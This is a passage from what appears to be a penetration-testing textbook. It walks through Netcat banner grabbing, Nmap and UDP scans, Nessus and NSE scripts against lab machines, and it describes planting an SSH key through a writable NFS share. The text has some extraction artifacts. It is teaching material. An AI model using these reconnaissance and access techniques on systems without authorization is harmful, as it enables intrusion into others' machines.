SMB server that is missing the MS08-067 Microsoft patch available on the 
network. We can get a good idea about the network-based attack surface by 
mapping the network range and querying systems for listening ports. 
We can do this manually by connecting to ports with a tool such as 
telnet or Netcat and recording the results. Let‚Äôs use Netcat to connect to 
the Windows XP machine on port 25, the default port for the Simple Mail 
Transfer Protocol (SMTP). 
root@kali:~# nc -vv 192.168.20.10 25
nc: 192.168.20.10 (192.168.20.10) 25 [smtp]ÔÅµ ope
nc: using stream socket
nc: using buffer size 8192
nc: read 66 bytes from remote
220 bookxp SMTP Server SLmail 5.5.0.4433 Ready
ESMTP spoken here
nc: wrote 66 bytes to local
As it turns out, the Windows XP box is running an SMTP server 
on port 25 u. After we connected, the SMTP server announced itself 
as SLMail version 5.5.0.4433. 
Now, keep in mind that admins can change banners like this to say 
anything, even sending attackers and pentesters on a wild goose chase, 
studying vulnerabilities for a product that is not deployed. In most cases, 
however, versions in software banners will be fairly accurate, and just connecting to the port and viewing the banner provides a starting point for 
our pentesting research. Searching the Web for information about SLMail 
version 5.5.0.4433 may yield some interesting results. 
On the other hand, connecting to every possible TCP and UDP port on 
just one machine and noting the results can be time consuming. Luckily, 
computers are excellent at repetitive tasks like this, and we can use portscanning tools such as Nmap to find listening ports for us. 
N ote Everything we have done so far in this chapter is completely legal. But once we start
actively querying systems, we are moving into murky legal territory. Attempting to break 
into computers without permission is, of course, illegal in many countries. Though 
stealthy scan traffic may go unnoticed, you should practice the skills we study in the 
rest of this chapter (and the rest of this book) only on your target virtual machines or 
other systems you own or have written permission to test (known in the trade as a 
get-out-of-jail-free card). 
Information Gathering 125
Port Scanning with Nmap
Nmap is an industry standard for port scanning. Entire books have been 
written just about using Nmap, and the manual page may seem a bit daunting. We will cover the basics of port scanning here and come back to the 
tool in later chapters. 
Firewalls with intrusion-detection and prevention systems have made 
great strides in detecting and blocking scan traffic, so you might run an 
Nmap scan and receive no results at all. Though you could be hired to perform an external pentest against a network range with no live hosts, it‚Äôs more 
likely that you‚Äôre being blocked by a firewall. On the other hand, your Nmap 
results might instead say that every host is alive, and will be listening on every 
port if your scan is detected. 
A SYN Sca
Let‚Äôs start by running a SYN scan against our target machines. A SYN scan
is a TCP scan that does not finish the TCP handshake. A TCP connection 
starts with a three-way handshake: SYN4‚ÄäSYN-ACK4‚ÄäACK, as shown in 
Figure 5-7.
SYN
SYN-ACK
ACK
Figure 5-7: TCP three-way handshake 
In a SYN scan, Nmap sends the SYN and waits for the SYN-ACK if the 
port is open but never sends the ACK to complete the connection. If the 
SYN packet receives no SYN-ACK response, the port is not available; either 
it‚Äôs closed or the connection is being filtered. This way, Nmap finds out if a 
port is open without ever fully connecting to the target machine. The syntax for a SYN scan is the -sS flag. 
Next, as you can see in Listing 5-6, we specify the IP address(s) or range 
to scan. Finally, we use the -o option to output our Nmap results to a file. The 
-oA option tells Nmap to log our results in all formats: .nmap, .gnmap (greppable Nmap), and XML. Nmap format, like the output that Nmap prints 
to the screen in Listing 5-6, is nicely formatted and easy to read. Greppable 
Nmap (as the name implies) is formatted to be used with the grep utility to 
search for specific information. XML format is a standard used to import 
Nmap results into other tools. Listing 5-6 shows the results of the SYN scan.
N ote It is always a good idea to take good notes of everything we do on our pentest.
Tools such as Dradis are designed specifically to track pentest data, but as long 
as you have notes of everything you did when you get to the reporting phase, 
you will be okay. I personally am more of a pen-and-paper user, or at best, a 
126 Chapter 5
creating-a-long-Word-document-with-all-of-my-results type. The methods used for tracking results vary from pentester to pentester. Outputting your Nmap results to files is a 
good way to make sure you have a record of your scan. Also, you can use the Linux 
command script to record everything printed to your terminal‚Äîanother good way to 
keep track of everything you have done. 
root@kali:~# nmap -sS 192.168.20.10-12 -oA booknmap
Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 07:28 EST
Nmap scan report for 192.168.20.10
Host is up (0.00056s latency).
Not shown: 991 closed ports
PORT STATE SERVICE
21/tcp open ftp v
25/tcp open smtp y
80/tcp open http w
106/tcp open pop3pw y
110/tcp open pop3 y
135/tcp open msrpc
139/tcp open netbios-ssn x
443/tcp open https w
445/tcp open microsoft-ds x
1025/tcp open NFS-or-IIS
3306/tcp open mysql z
5000/tcp open upnp
MAC Address: 00:0C:29:A5:C1:24 (VMware)
Nmap scan report for 192.168.20.11
Host is up (0.00031s latency).
Not shown: 993 closed ports
PORT STATE SERVICE
21/tcp open ftp v
22/tcp open ssh
80/tcp open http w
111/tcp open rpcbind
139/tcp open netbios-ssn x
445/tcp open microsoft-ds x
2049/tcp open nfs
MAC Address: 00:0C:29:FD:0E:40 (VMware)
Nmap scan report for 192.168.20.12
Host is up (0.0014s latency).
Not shown: 999 filtered ports
PORT STATE SERVICE
80/tcp open http u
135/tcp open msrpc
MAC Address: 00:0C:29:62:D5:C8 (VMware)
Nmap done: 3 IP addresses (3 hosts up) scanned in 1070.40 seconds
Listing 5-6: Running an Nmap SYN scan 
Information Gathering 127
As you can see, Nmap returns a handful of ports on the Windows XP 
and Linux boxes. We will see as we move through the next few chapters that 
nearly all of these ports contain vulnerabilities. Hopefully, that won‚Äôt be the 
case on your pentests, but in an attempt to introduce you to many types of 
vulnerabilities you will encounter in the field, our pentesting lab has been 
condensed into these three machines. 
That said, just because a port is open does not mean that vulnerabilities 
are present. Rather it leaves us with the possibility that vulnerable software 
might be running on these ports. Our Windows 7 machine is listening only 
on port 80 u, the traditional port for HTTP web servers, and port 139 
for remote procedure call. There may be exploitable software listening 
on ports that are not allowed through the Windows firewall, and there 
may be vulnerable software running locally on the machine, but at the 
moment we can‚Äôt attempt to exploit anything directly over the network 
except the web server. 
This basic Nmap scan has already helped us focus our pentesting efforts. 
Both the Windows XP and Linux targets are running FTP servers v, web 
servers w, and SMB servers x. The Windows XP machine is also running a 
mail server that has opened several ports y and a MySQL server z.
A Version Sca
Our SYN scan was stealthy, but it didn‚Äôt tell us much about the software that 
is actually running on the listening ports. Compared to the detailed version 
information we got by connecting to port 25 with Netcat, the SYN scan‚Äôs 
results are a bit lackluster. We can use a full TCP scan (nmap -sT) or go a 
step further and use Nmap‚Äôs version scan (nmap -sV) to get more data. With 
the version scan shown in Listing 5-7, Nmap completes the connection and 
then attempts to determine what software is running and, if possible, the 
version, using techniques such as banner grabbing. 
root@kali:~# nmap -sV 192.168.20.10-12 -oA bookversionnmap
Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 08:29 EST
Nmap scan report for 192.168.20.10 
Host is up (0.00046s latency).
Not shown: 991 closed ports
PORT STATE SERVICE VERSION
21/tcp open ftp FileZilla ftpd 0.9.32 beta
25/tcp open smtp SLmail smtpd 5.5.0.4433
79/tcp open finger SLMail fingerd
80/tcp open http Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k 
 mod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)
106/tcp open pop3pw SLMail pop3pw
110/tcp open pop3 BVRP Software SLMAIL pop3d
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn
443/tcp open ssl/http Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k 
 mod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)
445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds
1025/tcp open msrpc Microsoft Windows RPC
128 Chapter 5
3306/tcp open mysql MySQL (unauthorized)
5000/tcp open upnp Microsoft Windows UPnP
MAC Address: 00:0C:29:A5:C1:24 (Vmware)
Service Info: Host: georgia.com; OS: Windows; CPE: cpe:/o:microsoft:windows
Nmap scan report for 192.168.20.11
Host is up (0.00065s latency).
Not shown: 993 closed ports
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 2.3.4 u
22/tcp open ssh OpenSSH 5.1p1 Debian 3ubuntu1 (protocol 2.0)
80/tcp open http Apache httpd 2.2.9 ((Ubuntu) PHP/5.2.6-2ubuntu4.6 with 
 Suhosin-Patch)
111/tcp open rpcbind (rpcbind V2) 2 (rpc #100000)
139/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
2049/tcp open nfs (nfs V2-4) 2-4 (rpc #100003)
MAC Address: 00:0C:29:FD:0E:40 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:kernel
Nmap scan report for 192.168.20.12 
Host is up (0.0010s latency).
Not shown: 999 filtered ports
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 7.5
135/tcp open msrpc Microsoft Windows RPC
MAC Address: 00:0C:29:62:D5:C8 (VMware)
Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 20.56 seconds
Listing 5-7: Running an Nmap version scan 
This time we gained much more information about our Windows XP 
and Linux targets. For example, we knew there was an FTP server on the 
Linux box, but now we have reasonable assurance that the FTP server is Very 
Secure FTP version 2.3.4 u. We‚Äôll use this output to search for potential vulnerabilities in the next chapter. As for our Windows 7 system, we found out 
only that it‚Äôs running Microsoft IIS 7.5, a fairly up-to-date version. It‚Äôs possible 
to install IIS 8 on Windows 7, but it‚Äôs not officially supported. The version 
itself would not raise any red flags to me. We will find that the application 
installed on this IIS server is the real issue in Chapter 14.
N ote Keep in mind that Nmap may report the wrong version in some cases (for instance,
if the software has been updated, but the welcome banner is not edited as part of the 
patch), but at the very least, its version scan gave us a good place to begin further 
research. 
UDP Scans
Both Nmap‚Äôs SYN and version scans are TCP scans that do not query UDP 
ports. Because UDP is connectionless, the scanning logic is a bit different. 
Information Gathering 129
In a UDP scan (-sU), Nmap sends a UDP packet to a port. Depending on 
the port, the packet sent is protocol specific. If it receives a response, the 
port is considered open. If the port is closed, Nmap will receive an ICMP 
Port Unreachable message. If Nmap receives no response whatsoever, then 
either the port is open and the program listening does not respond to 
Nmap‚Äôs query, or the traffic is being filtered. Thus, Nmap is not always able 
to distinguish between an open UDP port and one that is filtered by a firewall. See Listing 5-8 for a UDP scan example.
root@kali:~# nmap -sU 192.168.20.10-12 -oA bookudp
Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 08:39 EST
Stats: 0:11:43 elapsed; 0 hosts completed (3 up), 3 undergoing UDP Scan
UDP Scan Timing: About 89.42% done; ETC: 08:52 (0:01:23 remaining)
Nmap scan report for 192.168.20.10
Host is up (0.00027s latency).
Not shown: 990 closed ports
PORT STATE SERVICE
69/udp open|filtered tftp u
123/udp open ntp
135/udp open msrpc
137/udp open netbios-ns
138/udp open|filtered netbios-dgm
445/udp open|filtered microsoft-ds
500/udp open|filtered isakmp
1026/udp open win-rpc
1065/udp open|filtered syscomlan
1900/udp open|filtered upnp
MAC Address: 00:0C:29:A5:C1:24 (VMware)
Nmap scan report for 192.168.20.11
Host is up (0.00031s latency).
Not shown: 994 closed ports
PORT STATE SERVICE
68/udp open|filtered dhcpc
111/udp open rpcbind
137/udp open netbios-ns
138/udp open|filtered netbios-dgm
2049/udp open nfs v
5353/udp open zeroconf
MAC Address: 00:0C:29:FD:0E:40 (VMware)
Nmap scan report for 192.168.20.12
Host is up (0.072s latency).
Not shown: 999 open|filtered ports
PORT STATE SERVICE
137/udp open netbios-ns
MAC Address: 00:0C:29:62:D5:C8 (VMware)
Nmap done: 3 IP addresses (3 hosts up) scanned in 1073.86 seconds
Listing 5-8: Running a UDP scan 
130 Chapter 5
For example, on the Windows XP system, the TFTP port (UDP 69) may 
be open or filtered u. On the Linux target, Nmap was able to glean that 
the Network File System port is listening v. Because only two TCP ports 
responded on the Windows 7 box, it‚Äôs fair to assume that a firewall is in 
place, in this case the built-in Windows firewall. Likewise, the Windows firewall is filtering all traffic except to one UDP port. (If the Windows firewall 
were not in place, our UDP scan might give us more information.) 
Scanning a Specific Port
By default, Nmap scans only the 1,000 ports it considers the most ‚Äúinteresting,‚Äù not the 65,535 possible TCP or UDP ports. The default Nmap scan will 
catch common running services, but in some cases it will miss a listening port 
or two. To scan specific ports, use the -p flag with Nmap. For example, to 
scan port 3232 on the Windows XP target, see Listing 5-9.
root@Kali:~# nmap -sS -p 3232 192.168.20.10
Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 09:03 EST
Nmap scan report for 192.168.20.10
Host is up (0.00031s latency).
PORT STATE SERVICE
3232/tcp open unknown
MAC Address: 00:0C:29:A5:C1:24 (VMware)
Listing 5-9: Running an Nmap scan on a specific port
Sure enough, when we tell Nmap to scan 3232, it returns open, which 
shows that this port is worth checking out, in addition to the default Nmap 
scanned ports. However, if we try to probe the port a bit more aggressively 
with a version scan (see Listing 5-10), the service listening on the port 
crashes, as shown in Figure 5-8. 
N ote A good rule of thumb is to specify ports 1 through 65535 on your pentests, just to
make sure there‚Äôs nothing listening on those other ‚Äúuninteresting‚Äù ports. 
root@kali:~# nmap -p 3232 -sV 192.168.20.10
Starting Nmap 6.40 ( http://nmap.org ) at 2015-04-28 10:19 EDT
Nmap scan report for 192.168.20.10
Host is up (0.00031s latency).
PORT STATE SERVICE VERSION
3232/tcp open unknown
1 service unrecognized despite returning datau. If you know the service/
version, please submit the following fingerprint at http://www.insecure.org/
cgi-bin/servicefp-submit.cgi : v
SF-Port3232-TCP:V=6.25%I=7%D=4/28%Time=517D2FFC%P=i686-pc-linux-gnu%r(GetR
SF:equest,B8,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Zervit\x200\.4\r\nwX-Pow
Information Gathering 131
SF:ered-By:\x20Carbono\r\nConnection:\x20close\r\nAccept-Ranges:\x20bytes\
SF:r\nContent-Type:\x20text/html\r\nContent-Length:\x2036\r\n\r\n<html>\r\
SF:n<body>\r\nhi\r\n</body>\r\n</html>");
MAC Address: 00:0C:29:13:FA:E3 (VMware)
Listing 5-10: Running a version scan against a specific port
Figure 5-8: The Zervit server crashes when scanned by Nmap.
In the process of crashing the listening service, Nmap can‚Äôt figure out 
what software is running as noted at u, but it does manage to get a fingerprint of the service. Based on the HTML tags in the fingerprint at v, this 
service appears to be a web server. According to the Server: field, it is something called Zervit 0.4 w. 
At this point, we have crashed the service, and we may never see it 
again on our pentest, so any potential vulnerabilities may be a moot point. 
Of course, in our lab we can just switch over to our Windows XP target and 
restart the Zervit server. 
N ote Though hopefully you won‚Äôt make any services crash on your pentests, there is always
a possibility that you will run into a particularly sensitive service that was not coded 
to accept anything other than expected input, such that even seemingly benign traffic 
like an Nmap scan causes it to crash. SCADA systems are particularly notorious for 
this sort of behavior. You always want to explain this to your client. When working 
with computers, there are no guarantees.
We‚Äôll return to the Nmap tool in the next chapter when we use the 
Nmap Scripting Engine (NSE) to learn detailed vulnerability information 
about our target systems before beginning exploitation.
132 Chapter 5
Summar
In this chapter we‚Äôve managed to cover a lot of ground very quickly just by 
using publicly available sources and port scanners. We used tools such as 
theHarvester and Maltego to scour the Internet for information such as 
email addresses and websites. We used the Nmap port scanner to find out 
which ports are listening on our target virtual machines. Based on the 
output we‚Äôve discovered, we can now do some research on known vulnerabilities as we start to think like attackers and actively seek exploitable vulnerabilities in the systems. In the next chapter, we‚Äôll cover the vulnerability 
analysis phase of penetration testing. 
6
F i n ding Vul nera bilitie
Before we start slinging exploits, we need to do some 
more research and analysis. When identifying vulnerabilities, we actively search for issues that will lead to 
compromise in the exploitation phase. Although some 
security firms will just run an automated exploitation tool and hope for the 
best, careful study of the vulnerabilities by a skilled pentester will garner 
better results than any tool on its own. 
We‚Äôll examine several vulnerability analysis methods in this chapter, 
including automated scanning, targeted analysis, and manual research. 
From Nmap Version Scan to Potential Vulnerabilit
Now that we have some information about our target and the attack surface, we can develop scenarios to reach our pentest goals. For example, the 
FTP server on port 21 announced itself as Vsftpd 2.3.4. Vsftpd is short for 
Very Secure FTP. 
We might assume that a product that calls itself very secure is asking for 
trouble, and in fact, in July 2011, it came to light that the Vsftpd repository 
134 Chapter 6
had been breached. The Vsftpd binaries had been replaced with a backdoored version that could be triggered with a username containing a smiley 
face :). This opens a root shell on port 6200. Once the issue was discovered, 
the backdoored binaries were removed, and the official Vsftpd 2.3.4 was put 
back in place. So, though the presence of Vsftpd 2.3.4 doesn‚Äôt guarantee that 
our target is vulnerable, it is definitely a threat to consider. Pentesting doesn‚Äôt 
get much easier than piggybacking on an attacker who already owns a system. 
Nessu
Tenable Security‚Äôs Nessus is one of the most widely used commercial vulnerability scanners, though many vendors provide comparable products. 
Nessus shares its name with a centaur who was slain by the Greek mythological hero, Heracles, and whose blood later killed Heracles himself. The 
Nessus database includes vulnerabilities across platforms and protocols, 
and its scanner performs a series of checks to detect known issues. You‚Äôll 
find entire books and training courses devoted to Nessus, and as you become 
more familiar with the tool, you‚Äôll find what works best for you. I‚Äôll provide 
only a high-level discussion of Nessus here.
Nessus is available as a paid professional version that pentesters and inhouse security teams can use to scan networks for vulnerabilities. You can 
use the free, noncommercial version called Nessus Home to try the exercises in this book. Nessus Home is limited to scanning 16 IP addresses. 
(Nessus isn‚Äôt preinstalled on Kali, but we covered installing it in Chapter 1.)
Before you can run Nessus you need to start the Nessus daemon. To do 
so, enter the service command as shown here to start the Nessus web interface on TCP port 8834. 
root@kali:~# service nessusd start 
Now open a web browser, and access Nessus by directing the Iceweasel 
browser to https://kali:8834. (If you want to access the Nessus interface 
from another system, such as the host, you must replace kali with the IP 
address of the Kali machine.) After a few minutes of initialization, you 
should see a login screen, shown in Figure 6-1. Use the login credentials 
you created in Chapter 1. 
Nessus Policies
The Nessus web interface has several tabs at the top of the screen, as shown 
in Figure 6-2. Let‚Äôs start with the Policies tab. Nessus policies are like configuration files that tell Nessus which vulnerability checks, port scanners, and 
so on to run in the vulnerability scan. 
Finding Vulnerabilities 135
Figure 6-1: The Nessus web interface login screen 
Figure 6-2: Nessus policies
To create a policy, click New Policy at the left of the Nessus interface. 
Nessus‚Äôs policy wizards will help you create a policy that will be useful 
for your scanning goals, as shown in Figure 6-3. For our simple example, 
choose Basic Network Scan.
136 Chapter 6
Figure 6-3: Nessus policy wizards
Now you are prompted for some basic information about the policy, as 
shown in Figure 6-4, including a name, a description, and whether other 
Nessus users can access the policy. Once you are done, click Next.
Figure 6-4: Basic policy setup
Now you are asked if this is an internal or external scan, as shown in 
Figure 6-5. Choose Internal and click Next.
Finding Vulnerabilities 137
Figure 6-5: Internal or external scan
If you have credentials, Nessus can authenticate with hosts and look for 
vulnerabilities that may not be apparent from a network-facing perspective. 
This feature is often used by internal security teams to test the security 
posture of their networks. You can set these credentials in the next step, as 
shown in Figure 6-6. For now, you can leave this step blank and click Save.
Figure 6-6: Adding credentials (optional)
As shown in Figure 6-7, our new policy is now shown in the Policy tab.
138 Chapter 6
Figure 6-7: Our policy is added.
Scanning with Nessus 
Now, let‚Äôs switch to the Scans tab and run Nessus against our target 
machines. Click ScansÔÄ¥New Scan, and fill in the scan information,
as shown in Figure 6-8. Nessus needs to know the name for our scan 
(Name), which scan policy to use (Policy), and which systems to scan 
(Targets). 
Figure 6-8: Starting a Nessus scan
Finding Vulnerabilities 139
Nessus runs a series of probes against the target in an attempt to detect 
or rule out as many issues as possible. The running scan is added to the Scans 
tab as shown in Figure 6-9. 
Figure 6-9: Running a Nessus scan
Once the scan is finished, click it to view the results, as shown in 
Figure 6-10. 
Figure 6-10: High-level overview of the results
As shown in the figure, Nessus found several critical vulnerabilities on 
the Windows XP and Ubuntu targets. But it found only informational data 
on the Windows 7 box. 
To see details of a specific host, click it. Details of the Windows XP 
vulnerabilities are shown in Figure 6-11.
140 Chapter 6
Figure 6-11: Nessus categorizes and describes its results. 
Say what you want about vulnerability scanners, but it‚Äôs hard to find a 
product that can tell you as much about a target environment as quickly 
and with as little effort as Nessus. For example, Nessus‚Äôs results reveal that 
our Windows XP target is in fact missing the MS08-067 patch discussed in 
Chapter 4. It also seems to be missing other Microsoft patches affecting the 
SMB server. 
Which vulnerability is the most exploitable? The Nessus output for a 
particular issue will often give you some information about that issue‚Äôs potential exploitability. For example, clicking the MS08-067 vulnerability in the 
output (Figure 6-12) shows exploit code available for this vulnerability in 
Metasploit as well as other tools such as Core Impact and Canvas.
Figure 6-12: The MS08-067 Nessus entry provides detailed information.
A Note About Nessus Rankings
Nessus ranks vulnerabilities based on the Common Vulnerability Scoring 
System (CVSS), version 2, from the National Institute of Standards and 
Finding Vulnerabilities 141
Technology (NIST). Ranking is calculated based on the impact to the system if the issue is exploited. Though the higher the vulnerability ranking, 
the more serious Nessus thinks the vulnerability issue is, the actual risk of 
a vulnerability depends on the environment. For example, Nessus ranks 
anonymous FTP access as a medium-risk vulnerability. When restricted to 
nonsensitive files, however, anonymous FTP access can have a low to nonexistent risk. On the other hand, it isn‚Äôt unheard of for companies to leave 
copies of their proprietary source code lying around on a publicly available 
FTP server. If on an external pentesting engagement you can access the client‚Äôs biggest asset by logging in as anonymous on an FTP server, it‚Äôs safe to 
assume that any interested attacker can do the same, and this warrants an 
immediate call to your client contact. Tools are not capable of making this 
sort of distinction. For that you need a pentester. 
Why Use Vulnerability Scanners? 
Though some penetration testing courses leave out vulnerability scanning 
altogether and argue that a skilled pentester can find everything a scanner 
can, scanners are still valuable tools, especially because many pentests are 
performed within a shorter time window than anyone might like. But if one 
of the goals of your assessment is to avoid detection, you might think twice 
about using a loud vulnerability scanner. 
Though Nessus did not find every issue in our environment, its use, 
combined with the results of our information-gathering phase, has given 
us a solid starting point for exploitation. Even those pentesters who think 
that a pentester should replace a scanner during an engagement can benefit from knowing how to use scanning tools. Though in an ideal world, 
every company would perform regular, no-holds-barred pentests, in reality, 
there is plenty of vulnerability scanning work to go around. 
Exporting Nessus Results 
Once a Nessus scan finishes, you can export its findings from the Export 
button at the top of the scan details screen, as shown in Figure 6-13. 
Figure 6-13: Exporting Nessus scan results 
142 Chapter 6
Nessus can output results into PDF, HTML, XML, CSV, and other formats. You may want to hand off the raw results to your client for a vulnerability scanning engagement, but you should never export scanner results, 
slap your company letterhead on them, and call them pentest results. Much 
more analysis is involved in a penetration test than a vulnerability scan. You 
should always verify results from automated scanners and combine them 
with manual analysis to get a more complete picture of the vulnerabilities 
in the environment. 
Now for a look at some other methods of vulnerability analysis. 
Researching Vulnerabilities
If the Nessus summary page doesn‚Äôt give you enough information about a 
vulnerability, try a good old-fashioned Google search. Additionally, try 
searching http://www.securityfocus.com/, http://www.packetstormsecurity.org/, 
http://www.exploit-db.org/, and http://www.cve.mitre.org/. For example, you can 
search for vulnerabilities using the Common Vulnerabilities and Exposures 
(CVE) system, Microsoft patch number, and so on within a specific site using 
a Google query such as ‚Äúms08-067 site:securityfocus.com‚Äù. The MS08-067 vulnerability received a lot of attention, so you‚Äôll find no shortage of good information. (We looked at the details of this particular issue in Chapter 4.) 
Depending on your subject vulnerability, you may be able to find proofof-concept exploit code online as well. We‚Äôll look at working with public code 
in Chapter 19, but be warned that unlike the community-vetted exploits in a 
project such as Metasploit, not all code on the Internet does what it claims. 
The payload in a public exploit may destroy the target machine, or it may 
join your machine to the exploit author‚Äôs secret botnet. Be vigilant when 
working with public exploits, and carefully vet them before running them 
against a production network. (You may also be able to find in-depth information about some vulnerabilities posted by the researchers who originally 
found the issue.) 
The Nmap Scripting En
Now for another tool that provides vulnerability scanning. Just as Metasploit 
evolved from an exploitation framework into a fully fledged penetrationtesting suite with hundreds of modules, Nmap has similarly evolved beyond 
its original goal of port scanning. The Nmap Scripting Engine (NSE) lets 
you run publicly available scripts and write your own. 
You‚Äôll find the scripts packaged with the NSE in Kali at /usr/share/nmap
/scripts. The available scripts fall into several categories, including information gathering, active vulnerability assessment, searches for signs of previous compromises, and so on. Listing 6-1 shows NSE scripts available in your 
default Kali installation. 
root@kali:~# cd /usr/share/nmap/scripts
root@kali:/usr/local/share/nmap/scripts# ls
acarsd-info.nse ip-geolocation-geobytes.nse
Finding Vulnerabilities 143
address-info.nse ip-geolocation-geoplugin.nse
afp-brute.nse ip-geolocation-ipinfodb.nse
afp-ls.nse ip-geolocation-maxmind.nse
--snip--
Listing 6-1: Nmap scripts list 
To get more information about a particular script or category of scripts, 
enter the --script-help flag in Nmap. For example, to see all scripts in the 
default category enter nmap --script-help default, as shown in Listing 6-2. 
Many factors contribute to whether a script is included in the default category, including its reliability and whether the script is safe and unlikely to 
harm the target. 
root@kali:~# nmap --script-help default
Starting Nmap 6.40 ( http://nmap.org ) at 2015-07-16 14:43 EDT
--snip--
ftp-anon
Categories: default auth safe
http://nmap.org/nsedoc/scripts/ftp-anon.html
 Checks if an FTP server allows anonymous logins.
 If anonymous is allowed, gets a directory listing of the root directory and 
highlights writeable files.
--snip--
Listing 6-2: Nmap default scripts help
If you use the -sC flag to tell Nmap to run a script scan in addition to 
port scanning, it will run all the scripts in the default category, as shown in 
Listing 6-3. 
root@kali:~# nmap -sC 192.168.20.10-12
Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-30 20:21 EST
Nmap scan report for 192.168.20.10
Host is up (0.00038s latency).
Not shown: 988 closed ports
PORT STATE SERVICE
21/tcp open ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp 0 Aug 06 2009 incoming
|_-r--r--r-- 1 ftp ftp 187 Aug 06 2009 onefile.html
|_ftp-bounce: bounce working!
25/tcp open smtp
| smtp-commands: georgia.com, SIZE 100000000, SEND, SOML, SAML, HELP, VRFYu, EXPN, ETRN, XTRN, 
|_ This server supports the following commands. HELO MAIL RCPT DATA RSET SEND SOML SAML HELP 
NOOP QUIT 
79/tcp open finger
|_finger: Finger online user list request denied.
80/tcp open http
|_http-methods: No Allow or Public header in OPTIONS response (status code 302)
144 Chapter 6
| http-title: XAMPP 1.7.2 v 
|_Requested resource was http://192.168.20.10/xampp/splash.php
--snip--
3306/tcp open mysql
| mysql-info: MySQL Error detected!
| Error Code was: 1130
|_Host '192.168.20.9' is not allowed to connect to this MySQL server w
--snip--
Listing 6-3: Nmap default scripts output
As you can see, the Nmap Scripting Engine found a good deal of interesting information. For example, we see that the SMTP server on port 25 
of the Windows XP target allows the use of the VRFY u command, which 
allows us to see if a username exists on the mail server. If we have a valid 
username, use of this command will make credential-guessing attacks much 
more likely to succeed. 
We can also see that the web server on port 80 appears to be an XAMPP 
1.7.2 install v. As of this writing, the current stable version of XAMPP for 
Windows is 1.8.3. At the very least, the version we found is out of date, and 
it may also be subject to security issues. 
In addition to showing us potential vulnerabilities, NSE also allows us 
to rule out some services. For example, we can see that the MySQL server 
on port 3306 does not allow us to connect because our IP address is not 
authorized w. We may want to return to this port during post exploitation 
if we are able to compromise other hosts in the environment, but for now 
we can rule out MySQL vulnerabilities on this host. 
Running a Singl NSE S
Before we move on, let‚Äôs look at another example of using an NSE script, this 
time one that is not part of the default set. From our basic use of Nmap in 
the previous chapter, we know that our Linux target is running Network File 
System (NFS). NFS allows client computers to access local files over the network, but in your pentesting career, you may find that setting up NFS securely 
is easier said than done. Many users don‚Äôt think about the security consequences of giving remote users access to their files. What‚Äôs the worst that can 
happen, right? Who cares if I share my home directory with my coworkers? 
The NSE script nfs-ls.nse will connect to NFS and audit shares. We can 
see more information about an individual script with the --script-help command, as shown in Listing 6-4. 
root@kali:~# nmap --script-help nfs-ls
Starting Nmap 6.40 ( http://nmap.org ) at 2015-07-16 14:49 EDT
nfs-ls
Categories: discovery safe
Finding Vulnerabilities 145
http://nmap.org/nsedoc/scripts/nfs-ls.html
 Attempts to get useful information about files from NFS exports.
 The output is intended to resemble the output of <code>ls</code>.
--snip--
Listing 6-4: Nmap NFS-LS script details 
This script mounts the remote shares, audits their permissions, and 
lists the files included in the share. To run a script against our Linux target, we call it using the --script option and the script name, as shown in 
Listing 6-5. 
root@kali:/# nmap --script=nfs-ls 192.168.20.11
Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-28 22:02 EST
Nmap scan report for 192.168.20.11
Host is up (0.00040s latency).
Not shown: 993 closed ports
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 2.3.4
22/tcp open ssh OpenSSH 5.1p1 Debian 3ubuntu1 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.2.9 ((Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch)
111/tcp open rpcbind 2 (RPC #100000)
| nfs-ls: 
| Arguments:
| maxfiles: 10 (file listing output limited)
| 
| NFS Export: /export/georgiau
| NFS Access: Read Lookup Modify Extend Delete NoExecute
| PERMISSION UID GID SIZE MODIFICATION TIME FILENAME
| drwxr-xr-x 1000 1000 4096 2013-12-28 23:35 /export/georgia
| -rw------- 1000 1000 117 2013-12-26 03:41 .Xauthority
| -rw------- 1000 1000 3645 2013-12-28 21:54 .bash_history
| drwxr-xr-x 1000 1000 4096 2013-10-27 03:11 .cache
| -rw------- 1000 1000 16 2013-10-27 03:11 .esd_auth
| drwx------ 1000 1000 4096 2013-10-27 03:11 .gnupg
| ?????????? ? ? ? ? .gvfs
| -rw------- 1000 1000 864 2013-12-15 19:03 .recently-used.xbel
| drwx------ 1000 1000 4096 2013-12-15 23:38 .sshv
--snip--
Listing 6-5: Nmap NFS-LS scripts output
As you can see, the NSE script found the NFS share /export/georgia u on 
our Linux target. Of particular interest is the .ssh directory v, which may 
include sensitive information such as SSH keys and (if public key authentication is allowed on the SSH server) a list of authorized keys. 
When you run into an access-control mistake like this, one common pentest trick is to use the mistake and the write permission to add a new SSH 
146 Chapter 6
key to the authorized_keys list (in this case, ours). If that attempt succeeds, 
suddenly the seemingly minor issue of being able to edit a user‚Äôs documents 
turns into the ability to log in to the remote system and execute commands. 
Before we move on, let‚Äôs ensure that public key SSH authentication is 
enabled on our Linux target, allowing the attack we envisioned above to 
work successfully. Key-based login is considered the strongest form of SSH 
authentication and is recommended for security. A quick SSH attempt to 
our Linux target shows that public key authentication is allowed here u
(see Listing 6-6).
